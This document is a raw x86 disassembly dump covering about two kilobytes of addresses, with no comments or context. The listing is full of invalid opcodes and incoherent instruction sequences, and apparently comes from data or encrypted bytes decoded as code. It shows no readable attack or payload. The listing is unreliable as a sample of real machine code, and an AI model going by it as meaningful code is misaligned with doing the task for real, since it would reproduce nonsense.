  426fd0:	ret    0x86b2
  426fd3:	or     al,0xb2
  426fd5:	add    ch,BYTE PTR [ecx]
  426fd7:	(bad)  
  426fd8:	cld    
  426fd9:	adc    bh,0xef
  426fdc:	arpl   WORD PTR [edx],si
  426fde:	xor    BYTE PTR [edi-0x75],0x9
  426fe2:	sete   BYTE PTR [ebp-0x287f7273]
  426fe9:	mov    edx,DWORD PTR [ebx-0x4e]
  426fec:	push   ebx
  426fed:	ret    0x2b2
  426ff0:	sub    DWORD PTR [edx-0x300f37a],esi
  426ff6:	adc    bh,0x21
  426ff9:	arpl   WORD PTR [edx],si
  426ffb:	or     DWORD PTR [edi],ecx
  426ffd:	loopne 0x426f8c
  426fff:	lea    ecx,[ebp-0x7f8e8880]
  427005:	xchg   edi,eax
  427006:	and    DWORD PTR [eax+0x539befd7],eax
  42700c:	dec    ebp
  42700d:	push   eax
  42700e:	ja     0x426f9b
  427010:	dec    edi
  427011:	jb     0x42701c
  427013:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  42701a:	out    dx,al
  42701b:	pop    ebx
  42701c:	adc    BYTE PTR [edi+0x9],dh
  42701f:	cld    
  427020:	ja     0x42706f
  427022:	aad    0xfc
  427024:	ja     0x427039
  427026:	sbb    esp,edi
  427028:	ja     0x427029
  42702a:	ror    BYTE PTR [ecx],1
  42702c:	loopne 0x4270a5
  42702e:	dec    DWORD PTR [ecx]
  427030:	loopne 0x426fd9
  427032:	adc    ecx,edi
  427034:	jp     0x426fc3
  427036:	lea    ecx,[ebp-0x1ff68bcd]
  42703c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703d:	dec    ebp
  42703e:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  427042:	mov    bh,ah
  427044:	ja     0x427012
  427046:	or     eax,0xd40d77fc
  42704b:	cld    
  42704c:	ja     0x42709b
  42704e:	jl     0x42704c
  427050:	ja     0x427065
  427052:	sar    esp,cl
  427054:	ja     0x427055
  427056:	push   esp
  427057:	(bad)  
  427058:	ja     0x427059
  42705a:	(bad)  
  42705b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42705c:	adc    esp,DWORD PTR [esi+0x4da78f74]
  427062:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427066:	or     eax,0xa78fc40b
  42706b:	int3   
  42706c:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427070:	mov    dl,dh
  427072:	sbb    bl,0x35
  427075:	in     eax,dx
  427076:	out    0x8b,eax
  427078:	lea    ecx,[ecx]
  42707a:	loopne 0x4270f3
  42707c:	or     edi,edx
  42707e:	or     DWORD PTR [edi-0x33],edx
  427081:	lea    ecx,[ebp-0x72e1d073]
  427087:	lea    ecx,[ebp-0x3bf688f0]
  42708d:	inc    DWORD PTR [edi+0x8]
  427090:	lea    ecx,[ebp+0x977108d]
  427096:	div    eax
  427098:	or     DWORD PTR [edi-0x11eff689],ecx
  42709e:	pop    ebx
  42709f:	jnp    0x427104
  4270a1:	test   DWORD PTR [ecx],ecx
  4270a3:	jmp    0x80a3:0x4d4d4d9e
  4270aa:	ja     0x427074
  4270ac:	push   ebx
  4270ad:	mov    dl,0x80
  4270af:	lock enter 0x5ed,0xd
  4270b4:	stos   DWORD PTR es:[edi],eax
  4270b5:	les    esp,FWORD PTR [esi+0x538b7780]
  4270bb:	mov    dl,0x80
  4270bd:	lock mov edx,DWORD PTR [ebx-0x2]
  4270c1:	mov    dl,0xba
  4270c3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4270c9:	test   eax,0x8d21fb70
  4270ce:	xchg   edi,eax
  4270cf:	add    BYTE PTR [edi+0x7cc587ed],0x77
  4270d6:	mov    dh,dh
  4270d8:	and    al,0x6f
  4270da:	cmp    cl,dh
  4270dc:	cmc    
  4270dd:	and    al,0x6f
  4270df:	cmp    BYTE PTR [eax-0x69],dl
  4270e2:	mov    eax,DWORD PTR [eax+0x77501577]
  4270e8:	adc    eax,0x80157780
  4270ed:	int    0x2e
  4270ef:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  4270f5:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  4270fc:	lea    eax,[eax+0x657dec30]
  427102:	xchg   ebx,eax
  427103:	push   eax
  427104:	lock stc 
  427106:	xor    BYTE PTR [edi-0x76],0x80
  42710a:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  427111:	out    0x2f,al
  427113:	push   ebx
  427114:	jl     0x4270c8
  427116:	xchg   BYTE PTR [ebx+eiz*4],cl
  427119:	push   ebx
  42711a:	adc    DWORD PTR [edx-0x4d00d646],esi
  427120:	push   eax
  427121:	ja     0x4270a5
  427123:	xor    BYTE PTR [edi-0x76],0x80
  427127:	lock mov dl,BYTE PTR [ebx+0x7c]
  42712b:	mov    dl,0x86
  42712d:	or     al,0x53
  42712f:	adc    DWORD PTR [edx-0x4d00d646],esi
  427135:	push   eax
  427136:	ja     0x4270bc
  427138:	xor    BYTE PTR [edi-0x7],0x80
  42713c:	ins    DWORD PTR es:[edi],dx
  42713d:	or     ch,ch
  42713f:	xchg   BYTE PTR [ecx],ah
  427141:	push   eax
  427142:	ja     0x42713b
  427144:	xor    BYTE PTR [edi-0x7],0x80
  427148:	ins    DWORD PTR es:[edi],dx
  427149:	pop    ebp
  42714a:	xor    al,0xf9
  42714d:	jge    0x42719e
  42714f:	xchg   edx,eax
  427150:	xchg   ebp,eax
  427151:	xor    BYTE PTR [edi-0x7],0xd5
  427155:	sbb    eax,0x805d6d80
  42715a:	lock stc 
  42715c:	cmp    BYTE PTR [edi-0x6b],0x7d
  427160:	dec    ebx
  427161:	div    DWORD PTR [ebx]
  427163:	std    
  427164:	xor    BYTE PTR [edi-0x7],0x80
  427168:	ins    DWORD PTR es:[edi],dx
  427169:	pop    ebp
  42716a:	in     al,dx
  42716b:	mov    dl,0xc4
  42716d:	in     al,dx
  42716e:	sub    BYTE PTR [ebp-0x6b],0x50
  427172:	ja     0x4270fa
  427174:	xor    BYTE PTR [edi-0x76],0x80
  427178:	lock mov dl,BYTE PTR [ebx+0x7c]
  42717c:	push   ebx
  42717d:	adc    DWORD PTR [edx-0x454df37a],esi
  427183:	sub    edi,edi
  427185:	mov    dl,0x50
  427187:	ja     0x42719e
  427189:	xor    BYTE PTR [edi-0x76],0x80
  42718d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427191:	push   ebx
  427192:	adc    DWORD PTR [edx-0x794dd646],esi
  427198:	or     al,0xff
  42719a:	mov    dl,0x50
  42719c:	ja     0x4271b3
  42719e:	xor    BYTE PTR [edi-0x76],0x80
  4271a2:	lock mov dl,BYTE PTR [ebx+0x11]
  4271a6:	push   ebx
  4271a7:	jl     0x42715b
  4271a9:	mov    edx,0xc86b229
  4271ae:	push   DWORD PTR [edx+0x5071f080]
  4271b4:	cmp    dl,BYTE PTR [eax-0x69]
  4271b7:	adc    eax,0xf415777c
  4271bc:	and    al,0x6f
  4271be:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271c2:	repz and al,0x6f
  4271c5:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271c9:	cli    
  4271ca:	and    al,0x6f
  4271cc:	cmp    BYTE PTR [esi-0x727290c9],bh
  4271d2:	xor    BYTE PTR [edi-0x76],0x80
  4271d6:	lock mov dl,BYTE PTR [ebx+0x7c]
  4271da:	push   ebx
  4271db:	adc    DWORD PTR [edx-0x454df37a],esi
  4271e1:	sub    edi,edi
  4271e3:	mov    dl,0x50
  4271e5:	ja     0x42716b
  4271e7:	xor    BYTE PTR [edi-0x7a],0xec
  4271eb:	ja     0x42720e
  4271ed:	push   eax
  4271ee:	ja     0x427172
  4271f0:	dec    ebp
  4271f1:	xlat   BYTE PTR ds:[ebx]
  4271f2:	or     BYTE PTR [ebp-0x29],0x21
  4271f6:	xor    al,0xf9
  4271f9:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  4271ff:	ja     0x427216
  427201:	xor    BYTE PTR [edi+0x15],0x4f
  427205:	push   0xffffffd5
  427207:	(bad)  
  427208:	xor    BYTE PTR [edi-0x7e],0x50
  42720c:	ja     0x427191
  42720e:	xor    BYTE PTR [edi-0x7d],0x80
  427212:	lock and DWORD PTR [ebx-0x4e],eax
  427216:	push   eax
  427217:	ja     0x42719c
  427219:	xor    BYTE PTR [edi+0x15],0x80
  42721d:	lock adc eax,0xec716d80
  427223:	xchg   edx,eax
  427224:	and    DWORD PTR [eax-0x29c7c10],eax
  42722a:	in     al,0x19
  42722c:	xor    BYTE PTR [edi+0x15],0x80
  427230:	ins    DWORD PTR es:[edi],dx
  427231:	and    DWORD PTR [eax-0x6d13ea10],eax
  427237:	out    dx,eax
  427238:	xor    al,0x83
  42723b:	inc    ebx
  42723c:	mov    dl,0xbe
  42723e:	and    ch,BYTE PTR [edi]
  427240:	lea    ecx,[ebp+0x6f24f6fa]
  427246:	cmp    BYTE PTR [eax-0x29],dl
  427249:	scas   eax,DWORD PTR es:[edi]
  42724a:	jl     0x4272c3
  42724c:	std    
  42724d:	cmc    
  42724e:	and    al,0x6f
  427250:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  427254:	hlt    
  427255:	and    al,0x6f
  427257:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  42725b:	repz and al,0x6f
  42725e:	cmp    BYTE PTR [ecx],al
  427260:	ja     0x427211
  427262:	push   eax
  427263:	ja     0x42722d
  427265:	add    DWORD PTR [edi-0x3],esi
  427268:	push   eax
  427269:	ja     0x42729d
  42726b:	add    DWORD PTR [edi+0x76],esi
  42726e:	push   eax
  42726f:	ja     0x427286
  427271:	add    DWORD PTR [edi+0x6a],esi
  427274:	push   eax
  427275:	ja     0x4271fe
  427277:	xor    BYTE PTR [edi-0x76],0x80
  42727b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42727f:	push   ebx
  427280:	adc    DWORD PTR [edx-0x454df37a],esi
  427286:	sub    edi,edi
  427288:	mov    dl,0x50
  42728a:	ja     0x42720f
  42728c:	mov    esi,0x8d8decfe
  427291:	mov    ds:0x6f24f30d,al
  427296:	cmp    BYTE PTR [ecx],cl
  427298:	shld   esp,ebp,0x8d
  42729c:	(bad)  
  42729d:	loop   0x4272c0
  42729f:	dec    ebp
  4272a0:	xlat   BYTE PTR ds:[ebx]
  4272a1:	add    BYTE PTR [ecx],0x77
  4272a4:	bound  ecx,QWORD PTR [edx]
  4272a6:	xchg   BYTE PTR [ecx],cl
  4272a8:	test   al,0x4d
  4272aa:	dec    ebp
  4272ab:	xor    BYTE PTR [edi-0x75],0x80
  4272af:	lock mov edx,DWORD PTR [ebx+0x7c]
  4272b3:	push   ebx
  4272b4:	adc    DWORD PTR [edx-0x794dd646],esi
  4272ba:	or     al,0xff
  4272bc:	mov    dl,0x50
  4272be:	ja     0x427244
  4272c0:	push   eax
  4272c1:	xlat   BYTE PTR ds:[ebx]
  4272c2:	jp     0x427332
  4272c4:	out    0x7a,eax
  4272c6:	xor    BYTE PTR [edi+0x7a],0xb2
  4272ca:	xchg   BYTE PTR [ebx+edx*2],cl
  4272cd:	(bad)  
  4272ce:	mov    dl,0x2
  4272d0:	sub    edi,edi
  4272d2:	xor    dl,BYTE PTR [eax-0x29]
  4272d5:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  4272dc:	push   ebx
  4272dd:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4272e3:	mov    dl,0x86
  4272e5:	or     al,0xff
  4272e7:	mov    dl,0x80
  4272e9:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  4272f0:	push   ebx
  4272f1:	xchg   esp,eax
  4272f2:	mov    dl,0xbe
  4272f4:	or     al,0xb2
  4272f6:	clc    
  4272f7:	sub    edi,edi
  4272f9:	(bad)  
  4272fa:	in     al,dx
  4272fb:	mov    dl,0x80
  4272fd:	lock adc DWORD PTR [eax-0x29],0x66
  427302:	arpl   bp,di
  427304:	xlat   BYTE PTR ds:[ebx]
  427305:	sub    DWORD PTR [eax-0xf7f7489],eax
  42730b:	mov    edx,DWORD PTR [ebx+0x7c]
  42730e:	push   ebx
  42730f:	adc    DWORD PTR [edx-0x454df37a],esi
  427315:	sub    edi,edi
  427317:	mov    dl,0xa
  427319:	loop   0x42733c
  42731b:	add    DWORD PTR [edi+0x62],esi
  42731e:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  427324:	xor    BYTE PTR [edi-0x76],0x80
  427328:	lock mov dl,BYTE PTR [ebx+0x7c]
  42732c:	push   ebx
  42732d:	adc    DWORD PTR [edx-0x794dd646],esi
  427333:	or     al,0xff
  427335:	mov    dl,0x80
  427337:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  42733c:	sub    DWORD PTR [eax-0xf7f7589],eax
  427342:	mov    dl,BYTE PTR [ebx+0x7c]
  427345:	push   ebx
  427346:	adc    DWORD PTR [edx-0x454df37a],esi
  42734c:	sub    edi,edi
  42734e:	mov    dl,0xa
  427350:	loop   0x427373
  427352:	add    DWORD PTR [edi+0x62],esi
  427355:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  42735b:	xor    BYTE PTR [edi-0x38],0x80
  42735f:	lock enter 0x3080,0x80
  427364:	lea    edx,[ebx+0x11]
  427367:	push   ebx
  427368:	jl     0x42731c
  42736a:	mov    edx,0xc86b229
  42736f:	push   DWORD PTR [edx+0x622f758f]
  427375:	xor    al,0x8a
  427378:	adc    BYTE PTR [edi+0x532a538a],0x94
  42737f:	mov    dl,0xbe
  427381:	or     al,0xb2
  427383:	clc    
  427384:	sub    DWORD PTR [ecx],ecx
  427386:	loopne 0x4273f2
  427388:	(bad)  
  427389:	(bad)  
  42738a:	arpl   WORD PTR [edx+0xca20f09],si
  427390:	lea    ecx,[ebp-0x7fcd8880]
  427396:	lock xor al,BYTE PTR [eax+0x538d8030]
  42739d:	adc    DWORD PTR [ebx+0x7c],edx
  4273a0:	mov    dl,0xba
  4273a2:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273a8:	(bad)  
  4273a9:	jne    0x4273da
  4273ab:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273b1:	mov    dl,BYTE PTR [ebx+0x2a]
  4273b4:	push   ebx
  4273b5:	xchg   esp,eax
  4273b6:	mov    dl,0xbe
  4273b8:	or     al,0xb2
  4273ba:	clc    
  4273bb:	sub    DWORD PTR [ecx],ecx
  4273bd:	loopne 0x427429
  4273bf:	(bad)  
  4273c0:	(bad)  
  4273c1:	arpl   WORD PTR [edx+0xcda0f09],si
  4273c7:	lea    ecx,[ebp-0x7fea8880]
  4273cd:	lock adc eax,0x8d803080
  4273d3:	push   ebx
  4273d4:	adc    DWORD PTR [ebx+0x7c],edx
  4273d7:	mov    dl,0xba
  4273d9:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273df:	(bad)  
  4273e0:	jne    0x427411
  4273e2:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273e8:	mov    dl,BYTE PTR [ebx+0x2a]
  4273eb:	push   ebx
  4273ec:	xchg   esp,eax
  4273ed:	mov    dl,0xbe
  4273ef:	or     al,0xb2
  4273f1:	clc    
  4273f2:	sub    DWORD PTR [ecx],ecx
  4273f4:	loopne 0x427460
  4273f6:	(bad)  
  4273f7:	(bad)  
  4273f8:	arpl   WORD PTR [edx+0xc130f09],si
  4273fe:	lea    ecx,[ebp-0x7f788880]
  427404:	lock xchg DWORD PTR [eax+0x538d8030],eax
  42740b:	adc    DWORD PTR [ebx+0x7c],edx
  42740e:	mov    dl,0xba
  427410:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427416:	(bad)  
  427417:	jne    0x427448
  427419:	bound  eax,QWORD PTR [eax-0x687f7510]
  42741f:	mov    dl,BYTE PTR [ebx+0x2a]
  427422:	push   ebx
  427423:	xchg   esp,eax
  427424:	mov    dl,0xbe
  427426:	or     al,0xb2
  427428:	clc    
  427429:	sub    DWORD PTR [ecx],ecx
  42742b:	loopne 0x427497
  42742d:	(bad)  
  42742e:	(bad)  
  42742f:	arpl   WORD PTR [edx+0x3a830f09],si
  427435:	lea    ecx,[ebp-0x7fcd8880]
  42743b:	lock xor al,BYTE PTR [eax+0x538d8030]
  427442:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427448:	mov    dl,0x86
  42744a:	or     al,0xff
  42744c:	mov    dl,0x8f
  42744e:	jne    0x42747f
  427450:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427456:	adc    BYTE PTR [edi+0x539080c8],0x2a
  42745d:	mov    dl,0xbe
  42745f:	or     al,0x53
  427461:	xchg   esp,eax
  427462:	mov    dl,0xf8
  427464:	sub    edi,edi
  427466:	dec    BYTE PTR [edi-0x2b9d30cf]
  42746c:	mov    dl,0x80
  42746e:	lock adc eax,0x97803080
  427474:	adc    eax,0x2a539080
  427479:	mov    dl,0xbe
  42747b:	or     al,0x53
  42747d:	xchg   esp,eax
  42747e:	mov    dl,0xf8
  427480:	sub    edi,edi
  427482:	dec    BYTE PTR [edi-0x599d30cf]
  427488:	mov    dl,0x80
  42748a:	lock enter 0x3080,0x80
  42748f:	xchg   edi,eax
  427490:	enter  0x9080,0x53
  427494:	sub    dl,BYTE PTR [ebx-0x6c]
  427497:	mov    dl,0xbe
  427499:	or     al,0xb2
  42749b:	clc    
  42749c:	sub    edi,edi
  42749e:	dec    BYTE PTR [edi-0x29a930cf]
  4274a4:	std    
  4274a5:	or     DWORD PTR [edi-0x43],ecx
  4274a8:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  4274ae:	xor    al,0x15
  4274b1:	xor    BYTE PTR [eax],0x80
  4274b4:	lea    edx,[ebx+0x11]
  4274b7:	mov    dl,0xba
  4274b9:	sub    DWORD PTR [ebx+0x7c],edx
  4274bc:	mov    dl,0x86
  4274be:	or     al,0xff
  4274c0:	mov    dl,0x8f
  4274c2:	jne    0x4274f3
  4274c4:	bound  eax,QWORD PTR [eax+0x308032f0]
  4274ca:	adc    BYTE PTR [edi+0x53908032],0x2a
  4274d1:	mov    dl,0xbe
  4274d3:	or     al,0x53
  4274d5:	xchg   esp,eax
  4274d6:	mov    dl,0xf8
  4274d8:	sub    edi,edi
  4274da:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274e0:	mov    dl,0x80
  4274e2:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4274e9:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4274f0:	push   ebx
  4274f1:	xchg   esp,eax
  4274f2:	mov    dl,0xf8
  4274f4:	sub    edi,edi
  4274f6:	dec    BYTE PTR [edi-0x599d30cf]
  4274fc:	mov    dl,0x80
  4274fe:	lock xor al,BYTE PTR [eax+0x32978030]
  427505:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  42750c:	mov    esi,0x29f8b20c
  427511:	(bad)  
  427512:	dec    BYTE PTR [edi-0x29a930cf]
  427518:	std    
  427519:	or     DWORD PTR [edi-0x38],ecx
  42751c:	lea    ecx,[ebp-0x78887f73]
  427522:	xor    al,0x87
  427525:	xor    BYTE PTR [eax],0x80
  427528:	lea    edx,[ebx+0x11]
  42752b:	mov    dl,0xba
  42752d:	sub    DWORD PTR [ebx+0x7c],edx
  427530:	mov    dl,0x86
  427532:	or     al,0xff
  427534:	mov    dl,0x8f
  427536:	jne    0x427567
  427538:	bound  eax,QWORD PTR [eax+0x308015f0]
  42753e:	adc    BYTE PTR [edi+0x53908015],0x2a
  427545:	mov    dl,0xbe
  427547:	or     al,0x53
  427549:	xchg   esp,eax
  42754a:	mov    dl,0xf8
  42754c:	sub    edi,edi
  42754e:	dec    BYTE PTR [edi-0x2b9d30cf]
  427554:	mov    dl,0x80
  427556:	lock enter 0x3080,0x80
  42755b:	xchg   edi,eax
  42755c:	enter  0x9080,0x53
  427560:	sub    dh,BYTE PTR [edx-0x6bacf342]
  427566:	mov    dl,0xf8
  427568:	sub    edi,edi
  42756a:	dec    BYTE PTR [edi-0x599d30cf]
  427570:	mov    dl,0x80
  427572:	lock adc eax,0x97803080
  427578:	adc    eax,0x2a539080
  42757d:	push   ebx
  42757e:	xchg   esp,eax
  42757f:	mov    dl,0xbe
  427581:	or     al,0xb2
  427583:	clc    
  427584:	sub    edi,edi
  427586:	dec    BYTE PTR [edi-0x29a930cf]
  42758c:	std    
  42758d:	or     DWORD PTR [edi-0x33],ecx
  427590:	lea    ecx,[ebp-0x78887f73]
  427596:	xor    al,0x87
  427599:	xor    BYTE PTR [eax],0x80
  42759c:	lea    edx,[ebx+0x11]
  42759f:	mov    dl,0xba
  4275a1:	sub    DWORD PTR [ebx+0x7c],edx
  4275a4:	mov    dl,0x86
  4275a6:	or     al,0xff
  4275a8:	mov    dl,0x8f
  4275aa:	jne    0x4275db
  4275ac:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  4275b2:	adc    BYTE PTR [edi+0x539080c8],0x2a
  4275b9:	mov    dl,0xbe
  4275bb:	or     al,0x53
  4275bd:	xchg   esp,eax
  4275be:	mov    dl,0xf8
  4275c0:	sub    edi,edi
  4275c2:	dec    BYTE PTR [edi-0x2b9d30cf]
  4275c8:	mov    dl,0x80
  4275ca:	lock xor al,BYTE PTR [eax+0x32978030]
  4275d1:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4275d8:	push   ebx
  4275d9:	xchg   esp,eax
  4275da:	mov    dl,0xf8
  4275dc:	sub    edi,edi
  4275de:	dec    BYTE PTR [edi-0x599d30cf]
  4275e4:	mov    dl,0x80
  4275e6:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4275ed:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4275f4:	mov    esi,0x29f8b20c
  4275f9:	(bad)  
  4275fa:	dec    BYTE PTR [edi-0x29a930cf]
  427600:	std    
  427601:	xlat   BYTE PTR ds:[ebx]
  427602:	jno    0x427605
  427604:	ja     0x427668
  427606:	or     al,BYTE PTR [esi+0x4d4dac84]
  42760c:	xor    al,0x5e
  42760f:	arpl   WORD PTR [edx+0x778017d5],si
  427615:	mov    al,BYTE PTR [eax+0x11538af0]
  42761b:	push   ebx
  42761c:	jl     0x4275d0
  42761e:	mov    edx,0xc86b229
  427623:	push   DWORD PTR [edx-0x7f7b88b0]
  427629:	ja     0x4275b6
  42762b:	adc    bh,0x8b
  42762e:	xor    BYTE PTR [edi-0x75],0x80
  427632:	lock mov edx,DWORD PTR [ebx+0x4b]
  427636:	push   ebx
  427637:	je     0x4275eb
  427639:	mov    BYTE PTR [edx+esi*4],cl
  42763c:	test   BYTE PTR [ecx],ch
  42763e:	push   DWORD PTR [edx]
  427640:	in     al,dx
  427641:	xlat   BYTE PTR ds:[ebx]
  427642:	data16 xor BYTE PTR [edi+0x7a],0x53
  427647:	sub    ch,ch
  427649:	mov    edx,0x8a84ed8a
  42764e:	mov    dl,0x88
  427650:	sub    esp,ebp
  427652:	std    
  427653:	inc    DWORD PTR ds:0x24f60ba2
  427659:	outs   dx,DWORD PTR ds:[esi]
  42765a:	cmp    BYTE PTR [eax-0xf7f7589],al
  427660:	mov    dl,BYTE PTR [ebx+0x11]
  427663:	push   ebx
  427664:	jl     0x427618
  427666:	mov    edx,0xc86b229
  42766b:	push   DWORD PTR [edx+0x6384f080]
  427671:	std    
  427672:	or     DWORD PTR [edi],ecx
  427674:	pop    ds
  427675:	mov    cl,BYTE PTR [ebp+0x4d]
  427678:	xor    BYTE PTR [edi-0x76],0x80
  42767c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427680:	push   ebx
  427681:	adc    DWORD PTR [edx-0x794dd646],esi
  427687:	or     al,0xff
  427689:	mov    dl,0x80
  42768b:	lock test BYTE PTR [ebx-0x3],ah
  42768f:	xlat   BYTE PTR ds:[ebx]
  427690:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427696:	mov    edx,DWORD PTR [ebx+0x7c]
  427699:	push   ebx
  42769a:	adc    DWORD PTR [edx-0x454df37a],esi
  4276a0:	sub    edi,edi
  4276a2:	mov    dl,0xbe
  4276a4:	jg     0x4276e0
  4276a6:	lea    ecx,[ebp-0x6656da1e]
  4276ac:	dec    ebp
  4276ad:	xlat   BYTE PTR ds:[ebx]
  4276ae:	add    BYTE PTR [ecx],0x77
  4276b1:	push   ss
  4276b2:	or     al,BYTE PTR [esi+0x4d4da00c]
  4276b8:	xor    BYTE PTR [edi-0x76],0x80
  4276bc:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276c0:	push   ebx
  4276c1:	adc    DWORD PTR [edx-0x794dd646],esi
  4276c7:	or     al,0xff
  4276c9:	mov    dl,0x80
  4276cb:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276d0:	xchg   ebx,eax
  4276d1:	xor    BYTE PTR [edi-0x75],0x80
  4276d5:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276d9:	push   ebx
  4276da:	adc    DWORD PTR [edx-0x794dd646],esi
  4276e0:	or     al,0xff
  4276e2:	mov    dl,0x80
  4276e4:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276e9:	daa    
  4276ea:	xor    BYTE PTR [edi-0x75],0x80
  4276ee:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276f2:	push   ebx
  4276f3:	adc    DWORD PTR [edx-0x454df37a],esi
  4276f9:	sub    edi,edi
  4276fb:	mov    dl,0xa
  4276fd:	cdq    
  4276fe:	add    DWORD PTR [edi+0x16],esi
  427701:	or     al,BYTE PTR [esi+0x4d4d8b34]
  427707:	xor    BYTE PTR [edi-0x76],0x80
  42770b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42770f:	push   ebx
  427710:	adc    DWORD PTR [edx-0x454df37a],esi
  427716:	sub    edi,edi
  427718:	mov    dl,0xa
  42771a:	cdq    
  42771b:	add    DWORD PTR [edi+0x16],esi
  42771e:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  427724:	xor    BYTE PTR [edi-0x7e],0xec
  427728:	cld    
  427729:	push   eax
  42772a:	ja     0x427741
  42772c:	dec    ebp
  42772d:	xlat   BYTE PTR ds:[ebx]
  42772e:	ds dec ebp
  427730:	xlat   BYTE PTR ds:[ebx]
  427731:	adc    eax,0xec367780
  427736:	ja     0x427727
  427738:	or     al,BYTE PTR [esi+0x4d4d82e5]
  42773e:	xor    BYTE PTR [edi-0x76],0x80
  427742:	lock mov dl,BYTE PTR [ebx+0x7c]
  427746:	push   ebx
  427747:	adc    DWORD PTR [edx-0x794dd646],esi
  42774d:	or     al,0xff
  42774f:	mov    dl,0x80
  427751:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427757:	xor    BYTE PTR [edi-0x75],0x80
  42775b:	lock mov edx,DWORD PTR [ebx+0x7c]
  42775f:	push   ebx
  427760:	adc    DWORD PTR [edx-0x794dd646],esi
  427766:	or     al,0xff
  427768:	mov    dl,0x80
  42776a:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  42776f:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  427776:	push   ebx
  427777:	jl     0x42772b
  427779:	xchg   BYTE PTR [ebx+edx*2],cl
  42777c:	adc    DWORD PTR [edx-0x4d00d646],esi
  427782:	or     cl,BYTE PTR [ebp-0x29]
  427785:	xor    BYTE PTR ds:[edi+0x36],0xec
  42778a:	ja     0x42777b
  42778c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427792:	xor    BYTE PTR [edi-0x76],0x80
  427796:	lock mov dl,BYTE PTR [ebx+0x7c]
  42779a:	mov    dl,0x86
  42779c:	or     al,0x53
  42779e:	adc    DWORD PTR [edx-0x4d00d646],esi
  4277a4:	or     cl,BYTE PTR [ebp-0x29]
  4277a7:	xor    BYTE PTR ds:[edi+0x36],0xec
  4277ac:	ja     0x42779d
  4277ae:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  4277b4:	xor    al,0x46
  4277b7:	xor    BYTE PTR [edi+0x46],0x53
  4277bb:	je     0x427810
  4277bd:	sub    dh,BYTE PTR [edx-0x7b4df342]
  4277c3:	sub    edi,edi
  4277c5:	mov    dl,0x80
  4277c7:	lock cs push ebx
  4277ca:	mov    dl,0x40
  4277cc:	lea    edi,[edx]
  4277ce:	lea    ecx,[ebp-0x72c8ea2b]
  4277d4:	int    0x8d
  4277d6:	lea    ecx,[edx]
  4277d8:	dec    ebp
  4277d9:	xlat   BYTE PTR ds:[ebx]
  4277da:	ds adc bh,0x36
  4277de:	in     al,dx
  4277df:	xlat   BYTE PTR ds:[ebx]
  4277e0:	out    dx,eax
  4277e1:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  4277e7:	ja     0x42785a
  4277e9:	xor    al,0x3e
  4277ec:	cmp    ch,bh
  4277ee:	xor    BYTE PTR [edi+0x3e],0xec
  4277f2:	ja     0x42777a
  4277f4:	push   eax
  4277f5:	ja     0x42777d
  4277f7:	xor    BYTE PTR [edi-0x75],0x80
  4277fb:	lock mov edx,DWORD PTR [ebx+0x11]
  4277ff:	mov    dl,0xba
  427801:	sub    DWORD PTR [ebx+0x7c],edx
  427804:	mov    dl,0x86
  427806:	or     al,0xff
  427808:	mov    dl,0x80
  42780a:	lock xchg BYTE PTR [ecx],cl
  42780d:	and    dh,BYTE PTR [edx-0x7f750f80]
  427813:	xchg   edi,eax
  427814:	mov    dl,BYTE PTR [ebx+0x2a]
  427817:	push   ebx
  427818:	xchg   esp,eax
  427819:	mov    dl,0xbe
  42781b:	or     al,0xb2
  42781d:	clc    
  42781e:	sub    edi,edi
  427820:	(bad)  
  427821:	in     al,dx
  427822:	lock mul DWORD PTR [ebx-0x4e]
  427826:	or     edx,ebp
  427828:	hlt    
  427829:	retf   
  42782a:	dec    ebp
  42782b:	dec    ebp
